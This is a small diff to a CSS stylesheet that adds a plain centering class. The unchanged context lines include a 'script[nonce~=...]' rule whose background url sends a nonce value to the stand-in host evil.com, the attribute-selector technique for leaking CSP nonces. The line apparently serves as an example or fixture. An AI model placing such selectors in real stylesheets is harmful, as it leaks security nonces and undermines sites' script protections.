@@ -99,6 +99,12 @@ footer {
     margin-right: auto;
 }
 
+.centr-100 {
+    width: 100%;
+    margin-left: auto;
+    margin-right: auto;
+}
+
 script[nonce~="whatever"] {
     background: url("https://evil.com/nonce?whatever");
 }
